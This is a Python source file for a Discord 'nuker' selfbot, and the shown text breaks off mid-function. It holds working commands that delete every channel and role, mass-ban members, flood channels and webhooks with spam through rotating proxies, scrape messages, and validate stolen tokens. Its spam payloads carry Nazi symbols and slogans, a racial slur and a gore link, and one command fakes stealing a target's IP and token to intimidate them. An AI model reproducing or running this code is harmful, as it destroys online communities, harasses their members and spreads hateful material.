
import os
# Hello, if you came here, I don't know how you find this repl
# But don't fork this project nor skid it, if you do you're a fucking skidlord
# I made it only for myself, I won't accept a useless skid who
# forks my projects and takes credits for my work.

import discord, requests
from discord.ext import commands
import asyncio
import random
import time
import threading
import aiohttp
import proxygen
from itertools import cycle
import replit
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
import json
import base64


cursed_text = """"
Sub to -> https://www.youtube.com/watch?v=npWrCJYrAfo

@everyone 
﻿
Halal Pictures on ---> https://kekma.net/, http://66.254.114.41/
﻿
https://cdn.discordapp.com/attachments/778995525865177121/781143814281756762/gore_56.mp4
﻿
SIEG HEIL HITLER
"""


default_token = os.environ['defeault_token']
usertoken = input("Insert your token > ")
if usertoken == "cazzo":
  usertoken = default_token

prefix = "%"

Answers = ["Yes", "ye", "yes", "YeS", "YEs", "YES", "yEs", "yeS", "yeah", "Yeah", "Yep", "yep", "YE", "Ye", "yE", "y", "Y"]

account_type = input("\n%s[!] Warning [!]%s\n%sAre you using an account token?%s %sYes/No%s > " % (yellow(), reset(), magenta(), reset(), green(), reset()))


replit.clear()

if account_type in Answers:
    try:
        slayer = commands.Bot(prefix, self_bot=True)
        headers = {
          "Authorization": usertoken
          }
    except:
      pass
else:
    try:
        intenzioni = input("\n%s[!]%s You have choosen a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
        if intenzioni in Answers:
            intents = discord.Intents().all()
            slayer = commands.Bot(prefix, intents=intents)
            headers = {
                "authorization": f"Bot {usertoken}"
                }
        else:
            slayer = commands.Bot(prefix)
            headers = {
                "authorization": f"Bot {usertoken}"
                }
    except:
        pass 


checkweb = False
proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)
proxy = next(proxy_pool)

@slayer.event
async def on_ready():
  print("\nSuccesfully connected.")


headers = {
    "Authorization": str(usertoken)
    }

async def deletechannels_worker(queue):
    # Rust told me how to do it, I don't know if it's skidded.
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                channel = queue.get_nowait()
                try:
                    request = await session.delete(f"https://discordapp.com/api/v9/channels/{channel.id}", headers=headers, ssl=False)
                except:
                    pass
                if request.status == 200:
                    print(f"Deleted Channel - {channel}")
                    queue.task_done()
                elif request.status == 429:
                    json = await request.json()
                    print(f"Rape limited")
                    await asyncio.sleep(json['retry_after'])
                    queue.put_nowait(channel)
                elif request.status in [401, 404, 403]:
                    return
                await session.close()
        except Exception as e:
            if isinstance(e, asyncio.QueueEmpty):
                await session.close()
                return
            elif 'Cannot connect to host discordapp.com:443 ssl:default [Name or service not known]' in str(e):
                queue.put_nowait(channel)
            else:
                print(e)



async def banmember_worker(queue, guild):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                member.id = queue.get_nowait()
                guildID = guild.id
                request = await session.put(f'https://discordapp.com/api/v9/guilds/{guildID}/bans/{member.id}', headers=headers)
                if request.status == 204: 
                    queue.task_done()
                elif request.status == 429:
                    json = await request.json()
                    print("Rape limited")
                    await asyncio.sleep(json['retry_after'])
                    queue.put_nowait(member.id)
                elif request.status in [401, 404, 403]:
                    return
            except Exception as e:
                if isinstance(e, asyncio.QueueEmpty):
                    await session.close()
                    return
                elif 'Cannot connect to host discordapp.com:443 ssl:default [Name or service not known]' in str(e):
                    queue.put_nowait(member.id)
                else:
                    print(e)

thechans = []
@slayer.command()
async def nuke(ctx):
    global checkweb
    global serwer
    checkweb = True
    extrapayload = {
        "banner": "null",
        "icon": "null",
    }
    serwer = str(ctx.guild.id)
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    try:
        await guild.edit(name="Nuked by Takaso | Sub to my YT")
    except:
        pass
    try:
        r = requests.patch(f"https://canary.discord.com/api/v9/guilds/{serwer}", headers=headers, json=extrapayload)
    except:
        pass
    for channel in guild.channels:
        thechans.append(channel.id)
    try:
        await deleteall()
    except:
        pass
    try:
        threadchan()
    except:
        pass
    try:
        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
        asyncio.gather(*roletasks)
    except:
        pass

channel_names = ["Hacked by Takaso", "Heil Takaso", "sus"]


##########################################################################################

# Extra Command I made to test the channel delete

@slayer.command()
async def tester(ctx, amount = 100, *, name = None):
  try:
      await ctx.message.delete()
  except:
      pass
  if name == None:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print("aaaaa")
        return
      except:
        pass
  else:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print("cazzo")
        return
      except:
        pass



async def deleteroles(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass

async def rolenuke(ctx):
    for x in range(500):
        try:
            await ctx.guild.create_role(name="Nuked by Takaso")
        except:
            pass

@slayer.command()
async def lastcheck(ctx):
    for channel in ctx.guild.channels:
        if channel.name != "heil-takaso":
            try:
                await channel.delete()
            except:
                pass

#########################################################################################


@slayer.command()
async def q_massban(ctx):
    global member
    try:
        await ctx.message.delete()
    except:
        pass
    queue = asyncio.Queue()
    toprole = ctx.guild.me.top_role
    members = await ctx.guild.chunk()
    for member in members[:500]:
        if toprole.position > member.top_role.position and member.id != slayer.user.id and member.id != ctx.guild.owner.id or slayer.user.id == ctx.guild.owner.id:
            queue.put_nowait(member.id)
        else:
            for member in members:
                if toprole.position > member.top_role.position and member.id != slayer.user.id and member.id != ctx.guild.owner.id or slayer.user.id == ctx.guild.owner.id:
                    queue.put_nowait(member.id)       
    tasks = []
    for x in range(5):
        task = asyncio.create_task(banmember_worker(queue, ctx.guild))
        tasks.append(task)
    await queue.join()
    for task in tasks:
        task.cancel()


@slayer.command()
async def load(ctx, ID):
    await ctx.message.delete()
    progress = [
     "1% - 〔█                              〕",
     "3% - 〔██                             〕",
     "6% - 〔███                            〕",
     "9% - 〔████                           〕",
     "12% -〔█████                          〕",
     "15% -〔██████                         〕",
     "18% -〔███████                        〕",
     "21% -〔███████                        〕",
     "22% -〔███████                        〕",
     "24% -〔████████                       〕",
     "26% -〔█████████                      〕",
     "29% -〔██████████                     〕",
     "31% -〔███████████                    〕",
     "36% -〔████████████                   〕",
     "41% -〔█████████████                  〕",
     "43% -〔██████████████                 〕",
     "46% -〔███████████████                〕",
     "49% -〔████████████████               〕",
     "50% -〔████████████████               〕",
     "52% -〔█████████████████              〕",
     "56% -〔██████████████████             〕",
     "59% -〔███████████████████            〕",
     "64% -〔████████████████████           〕",
     "69% -〔█████████████████████          〕",
     "71% -〔██████████████████████         〕",
     "74% -〔███████████████████████        〕",
     "79% -〔████████████████████████       〕",
     "82% -〔█████████████████████████      〕",
     "86% -〔██████████████████████████     〕",
     "89% -〔███████████████████████████    〕",
     "93% -〔████████████████████████████   〕",
     "93% -〔████████████████████████████   〕",
     "94% -〔█████████████████████████████  〕",
     "95% -〔█████████████████████████████  〕",
     "96% -〔█████████████████████████████  〕",
     "97% -〔█████████████████████████████  〕",
     "98% -〔██████████████████████████████ 〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     "100% -〔███████████████████████████████〕",
     ]
    kkk = await ctx.send(f"```\nStarting the process to steal <@{ID}>'s info.\n```")
    bar = await ctx.send("```\n0% - 〔█                              〕\n```")
    for loads in progress:
        await bar.edit(content=f"""
```
[{loads}]
```
""")
    await kkk.delete()
    await bar.delete()
    IP1 = random.randint(0, 255)
    IP2 = random.randint(0, 255)
    IP3 = random.randint(0, 255)
    IP4 = random.randint(0, 255)
    sample_string = str(ID)
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    try:
        await ctx.send(f"""
```
Here's the Info:

IPv4: {IP1}.{IP2}.{IP3}.{IP4}
First piece of Token: {base64_string}
```
""")
    except:
        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))

    
@slayer.command()
async def purge(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=500).filter(
        lambda m: m.author == slayer.user
    ).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass




@slayer.command()
async def q_del(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    queue = asyncio.Queue()
    for channel in ctx.guild.channels:
        queue.put_nowait(channel)
        print(f"Queuing all channels..")
    tasks = []
    for x in range(5):
        task = asyncio.create_task(deletechannels_worker(queue))
        tasks.append(task)
    await queue.join()
    for task in tasks:
        task.cancel()


thechans = []
@slayer.command()
async def cdel(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    for channel in guild.channels:
        thechans.append(channel.id)
    await deleteall()

def get_chans(session):
    tasks = []
    for niggurs in thechans:
        try:
            tasks.append(session.delete(f"https://discord.com/api/v9/channels/{niggurs}", headers=headers))
        except:
            pass
    return tasks

async def deleteall():
    async with aiohttp.ClientSession() as session:
        tasks = get_chans(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass 


@slayer.command()
async def ccr(ctx):
    try:
        await ctx.messagge.delete()
    except:
        pass
    global serwer
    serwer = str(ctx.guild.id)
    threadchan()

def chanflood():
    payload = {
        "name": "heil-takaso",
        "type": "0"
    }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/guilds/{serwer}/channels", headers=headers, json=payload, proxies={"http": proxy})
    except:
        pass

def threadchan():
    threads = []
    for i in range(8):
        t = threading.Thread(target=chanflood)
        threads.append(t)
        t.start()    


@slayer.event
async def on_guild_channel_create(channel):
  global checkweb
  if checkweb == True:
      webhook = await channel.create_webhook(name="Takaso")
      try:
          while True:
              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
      except:
          pass

@slayer.command()
async def idinfo(ctx, *, ID = None):
    # HypeSquad function source: https://stackoverflow.com/questions/66951118/discord-py-showing-user-badges
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        await ctx.send("I forgot to put the ID.", delete_after=4)
    try:
        user = await slayer.fetch_user(ID)
    except:
        await ctx.send("Invalid ID.", delete_after=5)
    date_format = "%a, %d %b %Y %I:%M %p"
    hypesquad_class = str(user.public_flags.all()).replace('[<UserFlags.', '').replace('>]', '').replace('_',
                                                                                                         ' ').replace(
        ':', '').title()
    hypesquad_class = ''.join([i for i in hypesquad_class if not i.isdigit()])
    em=discord.Embed(title="**〓〓〚Info Card〛〓〓**", description=f"""
**Username**
```
{user.name}#{user.discriminator}
```
**Account Creation**
```
{user.created_at.strftime(date_format)}
```
**HypeSquad**
```
{hypesquad_class}
```
""", color=0xffff00)
    em.set_thumbnail(url=user.avatar_url)
    try:
        await ctx.send(embed=em, delete_after=15)
    except:
        print("\n[%s-%s] Failed to send message!" % (red()), reset())


themembers = []
@slayer.command()
async def massban(ctx):
    global guild2
    try:
        await ctx.message.delete()
    except:
        pass
    guild2 = ctx.guild.id
    guild = ctx.guild
    for members in guild.members:
        try:
            themembers.append(members.id)
            themembers.remove(slayer.user.id)
        except:
            pass
    await banall()

def get_members(session):
    tasks = []
    for server_members in themembers:
        try:
            tasks.append(session.put(f"https://discord.com/api/v9/guilds/{guild2}/bans/{server_members}", headers=headers))
        except:
            pass
    return tasks

async def banall():
    async with aiohttp.ClientSession() as session:
        tasks = get_members(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass


@slayer.command()
async def spam(ctx, *, args = None):
    global msg
    global chan
    global stop
    stop = True
    if args == None:
        msg = cursed_text
    else:
        msg = args
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        chan = ctx.channel.id
    godspam1()

def godspambase():
    
    global msg
    global chan
    global stop
    payload = {
        "content" : msg
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": proxy})
            if stop == False:
                break    
    except:
        pass

def godspam1():
    threads = []
    for i in range(5):
        t = threading.Thread(target=godspambase)
        threads.append(t)
        t.start()


@slayer.command()
async def cancel(ctx):
    global raid
    global stop
    stop = False
    raid = False
    try:
        await ctx.message.delete()
    except:
        pass

@slayer.command()
async def tokeninfo(ctx, *, token = None):
    if token == None:
        failure = await ctx.send("You forgot the token.")
        time.sleep(4)
        await failure.delete()
    else:
        try:
            await ctx.message.delete()
        except:
            pass
        finally:
            toks = [str(token), f"Bot {token}"]
            for tok in toks:
                headers_of_tok = {
                    "Authorization": tok
                    }
                r = requests.get("https://discord.com/api/v9/users/@me", headers=headers_of_tok, proxies={"http": proxy})
            try:
                await ctx(f"```\n{r.text}\n```")
            except:
                pass


@slayer.command()
async def scrape_messages(ctx, ID = None):
    global Channel_ID
    Channel_ID = ID
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        s = await ctx.send("Insert an ID.")
        time.sleep(4)
        await s.delete()
    else:
        try:
            message_scraper()
        except:
            pass


@slayer.command()
async def everyone(ctx):
    global Channel_ID
    Channel_ID = ctx.channel.id
    try:
        await ctx.message.delete()
    except:
        pass
    message_scraper_ping()
    try:
        while True:
            godspam2()
    except:
        pass
    


def message_scraper():
    global Channel_ID
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, proxies={"http": proxy})
    jsonn = json.loads(r.text)
    for value in jsonn:
        print(f"Name: {value['author']['username']}, Message: {value['content']}", "\n")

scraped = []
def message_scraper_ping():
    global Channel_ID
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, proxies={"http": proxy})
    jsonn = json.loads(r.text)
    for value in jsonn:
        ll = value['author']['id']
        scraped.append(ll)



def godspambase2():
    global Channel_ID
    global stop
    payload = {
        "content" : f"> <@{(random.choice(scraped))}> <@{(random.choice(scraped))}> <@{(random.choice(scraped))}> <@{(random.choice(scraped))}>\nHeil {slayer.user} @everyone"
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, data=payload, proxies={"http": proxy})
            if stop == False:
                break    
    except:
        pass

def godspam2():
    threads = []
    for i in range(50):
        t = threading.Thread(target=godspambase2)
        threads.append(t)
        t.start()


@slayer.command()
async def react(ctx):
    global Channel_ID
    Channel_ID = ctx.channel.id
    try:
        await ctx.message.delete()
    except:
        pass
    try:
        message_scraper_react()
    finally:
        react_messages()

scraped_2 = []
def message_scraper_react():
    global Channel_ID
    headers = {
        "Authorization": usertoken
    }

    r = requests.get(
        f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, proxies={"http": proxy})
    jsonn = json.loads(r.text)
    for value in jsonn:
        ll2 = value['id']
        scraped_2.append(ll2)


def react_messages():
    global Channel_ID
    for emoji_to_add in scraped_2:
        try:
            r = requests.put(f"https://discord.com/api/v9/channels/{Channel_ID}/messages/{emoji_to_add}/reactions/%F0%9F%A5%B6/%40me", headers=headers)
            if r.status == 200:
                print("Reacted message")    
            elif r.status == 429:
                json = r.json()
                print("Rape limited")
                time.sleep(json['retry_after'])
        except:
            pass

@slayer.command()
async def q_nuke(ctx):
    global checkweb
    global serwer
    checkweb = True
    serwer = str(ctx.guild.id)
    guild = ctx.guild
    try:
        await guild.edit(name="Nuked by Takaso | Sub to my YT")
    except:
        pass
    await q_del(ctx)
    try:
        threadchan()
    except:
        pass
    try:
        roletasks = [deleteroles(ctx), rolenuke(ctx), lastcheck(ctx)]
        asyncio.gather(*roletasks)
    except:
        pass


@slayer.command()
async def audit_logs(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    r = requests.get(f"https://discord.com/api/v9/guilds/{guild.id}/audit-logs", headers=headers, proxies={"http": proxy})
    jj = r.json()
    if r.status_code == 200:
        try:
            for obj in jj:
                await ctx.send(f"```\n{obj}\n```")
        except:
            pass
    elif r.status_code == 429:
        print("Rape limited")
        time.sleep(jj['retry_after'])
    else:
        try:
            for obj in jj:
                await ctx.send(f"```\n{obj}\n```")
        except:
            pass



@slayer.command()
async def copy_messages(ctx, ID = None):
    global Channel_ID
    Channel_ID = ID
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        s = await ctx.send("Insert an ID.")
        time.sleep(4)
        await s.delete()
    else:
        r = requests.get(f"https://discord.com/api/v9/channels/{Channel_ID}/messages", headers=headers, proxies={"http": proxy})
        jsonn = json.loads(r.text)
        for value in jsonn:
            try:
                await ctx.send(f"```\nName: {value['author']['username']}, Message: {value['content']}\n```")
            except:
                pass

@slayer.command()
async def edit(ctx, *, arg = None):
    if arg == None:
        new_content = "."
    else:
        new_content = arg
    messages = await ctx.channel.history(limit=None).flatten()
    for message in messages:
        try:
            await message.edit(content=new_content)
        except:
            pass


emoji = "😀😃😄😁😆😅😂🤣☺️😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲👐🙌🏻👏🏻🤝👍🏻👎👊✊🤛🤞🏼✌️🤟🏻🤘🏻👌🏻🤏👈🏻👉🏻👆🏼👇🏻☝️✋🏻🤚🖐🖖🏿👋🏻🤙🏼💪🏼🦾🖕🏻✍🏼🙏🏻🦶🦵🦿💄💋👄🦷👅👂🦻👃👣👁👀🧠🗣👤👥👶🏼👧🏻🧒👦🏻👩🏻🧑🏻👨👩‍🦱🧑‍🦱👨‍🦱👩‍🦰🧑‍🦰👨‍🦰👱‍♀️👱👱‍♂️👩‍🦳🧑‍🦳👨‍🦳👩‍🦲🧑‍🦲👨‍🦲🧔👵🏼🧓👴👲👳‍♀️👳‍♂️🧕👮‍♀️👮👮‍♂️👷‍♀️👷👷‍♂️💂‍♀️💂💂‍♂️🕵️‍♀️🕵️🕵️‍♂️👩🏼‍⚕️🧑‍⚕️👨‍⚕️👩‍🌾🧑‍🌾👨‍🌾👩‍🍳🧑‍🍳👨‍🍳👩‍🎓🧑‍🎓👨‍🎓👩‍🎤🧑🏿‍🎤👨🏼‍🎤👩‍🏫🧑‍🏫👨‍🏫👩‍🏭🧑‍🏭👨‍🏭👩‍💻🧑‍💻👨‍💻👩‍💼🧑‍💼👨‍💼👩‍🔧🧑‍🔧👨‍🔧👩‍🔬🧑‍🔬👨‍🔬👩‍🎨🧑‍🎨👨‍🎨👩‍🚒🧑‍🚒👨‍🚒👩‍✈️🧑‍✈️👨‍✈️👩‍🚀🧑‍🚀👨‍🚀👩‍⚖️👨‍⚖️🧑‍⚖️👰🤵👸🏻🤴🏻🦸🏼‍♀️🦸🦸🏻‍♂️🦹‍♀️🦹🦹‍♂️🤶🎅🏼🧙‍♀️🧙🧙‍♂️🧝‍♀️🧝🧝‍♂️🧛‍♀️🧛🧛‍♂️🧟‍♀️🧟🧟‍♂️🧞‍♀️🧞🧞‍♂️🧜🏻‍♀️🧜🧜‍♂️🧚🏼‍♀️🧚🧚‍♂️👼🏼🤰🤱🙇🏻‍♀️🙇🙇‍♂️💁‍♀️💁💁‍♂️🙅🏻‍♀️🙅🙅‍♂️🙆‍♀️🙆🙆‍♂️🙋‍♀️🙋🙋‍♂️🧏‍♀️🧏🧏‍♂️🤦🏻‍♀️🤦‍♂️🤷🏻‍♀️🤷🤷🏽‍♂️🙎🏻‍♀️🙎🙎‍♂️🙍🏻‍♀️🙍🙍‍♂️💇🏻‍♀️💇💇‍♂️💆🏻‍♀️💆💆‍♂️🧖‍♀️🧖🧖‍♂️🤳💃🏻🕺🏻👯‍♀️👯👯‍♂️🕴👩‍🦽👩‍🦽🧑‍🦽👨‍🦽👩‍🦼🧑🏿‍🦼👨‍🦼🚶‍♀️🚶🚶‍♂️👩‍🦯🧑‍🦯👨‍🦯🧎‍♀️🧎🧎‍♂️🏃‍♀️🏃🏃‍♂️🧍‍♀️🧍🧍‍♂️👫👩🏼‍🤝‍👩🏻👬👩‍❤️‍👨👩‍❤️‍👩👨‍❤️‍👨👩‍❤️‍💋‍👨👩‍❤️‍💋‍👩👨‍❤️‍💋‍👨👨‍👩‍👦👨‍👩‍👧👨‍👩‍👧‍👦👨‍👩‍👦‍👦👨‍👩‍👧‍👧👩‍👩‍👦👩‍👩‍👧👩‍👩‍👧‍👦👩‍👩‍👦‍👦👩‍👩‍👧‍👧👨‍👨‍👦👨‍👨‍👧👨‍👨‍👧‍👦👨‍👨‍👦‍👦👨‍👨‍👧‍👧👩‍👦👩‍👧👩‍👧‍👦👩‍👦‍👦👩‍👧‍👧👨‍👦👨‍👧👨‍👧‍👦👨‍👦‍👦👨‍👧‍👧🧶🧵🧥🥼🦺👚👕👖🩲🩳👔👗👙👘🥻🩱🥿👠👡👢👞👟👟🧦🧤🧣🎩🧢👒🎓⛑👑💍👝👜👛💼🎒🧳👓🕶🥽🌂🐶🐱🐭🐹🐰🦊🐻🐼🐨🐯🦁🐮🐷🐽🐸🐵🙈🙉🙊🐒🐔🐧🐦🐤🐣🐥🦆🦅🦉🦇🐺🐗🐴🦄🐝🐛🦋🐌🐞🐜🦟🦗🕷🕸🦂🐢🐍🦖🦎🦕🐙🦑🦐🦞🦀🐡🐠🐟🐬🐳🐋🦈🐊🐅🐆🦓🦍🦧🐘🦛🦏🐪🐫🦒🦘🐃🐂🐄🐎🐖🐏🐑🦙🐐🦌🐕🐩🦮🐕‍🦺🐈🐓🦃🦚🦜🦢🦩🕊🐇🦝🦨🦡🦦🦥🐁🐀🐿🦔🐾🐉🐲🌵🎄🌲🌳🌴🌱🌿☘️🍀🎍🎋🍃🍂🍁🍄🐚🌾💐🌷🌹🥀🌺🌸🌼🌻🌞🌝🌛🌜🌚🌕🌖🌗🌘🌑🌒🌓🌔🌙🌎🌍🌏🪐💫⭐️🌟✨⚡️☄️💥🔥🌪🌈☀️🌤⛅️🌥☁️🌦🌧⛈🌩🌨❄️☃️⛄️🌬💨💧💦☔️☂️🌊🌫🍏🍎🍐🍊🍋🍌🍉🍇🍓🍈🍒🍑🥭🍍🥥🥝🍅🍆🥑🥦🥬🥒"

@slayer.command()
async def emoji_flood(ctx):
    global chan
    global stop
    stop = True
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        chan = ctx.channel.id
    godspam3()

def godspambase_3():
    global chan
    global stop
    payload = {
        "content" : f"{emoji} @everyone"
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": proxy})
            if stop == False:
                break    
    except:
        pass

def godspam3():
    threads = []
    for i in range(5):
        t = threading.Thread(target=godspambase_3)
        threads.append(t)
        t.start()

@slayer.command()
async def nazi(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  nazi=discord.Embed(title="""
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥

SIEG HEIL TAKASO!
  """, description="""
  
 ...╚🔥 🔥╝...
          ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝          
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝

🇩🇪            🇩🇪🇩🇪🇩🇪🇩🇪
🇩🇪            🇩🇪
🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪
                  🇩🇪            🇩🇪
                  🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪            🇩🇪

⠀⠀⠀⠀⢀⣴⠶⠿⠟⠛⠻⠛⠳⠶⣄⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⣠⣶⣿⣿⣿⣶⣖⠶⢶⣤⡀⠀⠈⢿⣆⠀⠀⠀⠀⠀ ⢀⣴⣿⠋⠉⠉⠀⠀⠈⠉⠛⠿⢿⣷⡀⠀⠈⢷⡀⠀⠀⠀ ⡾⠉⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠘⣷⡀⠀⠀ ⣷⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⢸⡇⠀⠀ ⢻⡜⡄⠀⢀⣀⣤⣶⣶⡄⣴⣾⣿⣛⣓⠀⠀⣧⢸⣇⠀⠀ ⢈⣧⣧⠀⢩⠞⠿⠿⠻⠀⠘⠙⠃⠛⠛⠓⠀⣿⣻⠿⣷⠀ ⢸⡵⣿⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠀⠀⠀⠀⢻⣇⡟⠀ ⠘⢧⣿⡀⠀⠀⠀⠀⢧⣤⣤⣶⣗⠀⠀⠀⠀⠀⠜⣽⠁⠀ ⠀⠈⢿⣧⠀⠀⠀⠀⣿⣿⣿⣿⣿⣀⠀⠀⠀⢠⡟⠁⠀⠀ ⠀⠀⠀⠘⣇⠀⠀⠰⠋⠉⠙⠂⠀⠉⠀⠀⠀⣼⡅⠀⠀⠀ ⠀⠀⠀⠀⠹⣦⡀⠀⠀⠀⠉⠉⠁⠀⠀⠀⣠⠏⢻⣤⡀⠀ ⠀⠀⠀⠀⠀⢹⡷⢦⣄⣀⣀⣀⣀⣤⣴⡾⠃⠀⠘⡿⠙⢶ ⠀⠀⠀⠀⠀⢨⡷⣤⡀⠈⠉⠉⢁⡴⠋⠀⠀⠀⣸⠃⠀⠀
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥
  """, color=0xffffff)
  nazi.set_thumbnail(url="https://media.discordapp.net/attachments/704402813035479105/788428836181901342/image0-32.gif")
  nazi.set_image(url="https://media.discordapp.net/attachments/857290386518442078/860990642716278854/image0-4-3-1.gif")
  nazi.set_footer(text="卐 SIEG HEIL TAKASO, LMFAO 卐",icon_url="https://media.discordapp.net/attachments/704402813035479105/788428836181901342/image0-32.gif") 
  while raid:
    try:
        await ctx.send(f"@everyone 卐 Flooded by Takaso ☠" + 'ﾠﾠ'+'\n' * 300 + 'ﾠﾠ', embed=nazi)
    except:
        pass


cnames = ["Sus", "Takaso doge", "heil takaso", "takaso is op", "takasus", "NEGRO", "cazzo", "sieg heil takaso"]

@slayer.command()
async def cname(ctx, ID = None):
    global raid
    raid = True
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        try:
            m = await ctx.send("You forgot the channel ID.")
            await asyncio.sleep(4)
            await m.delete()
        except:
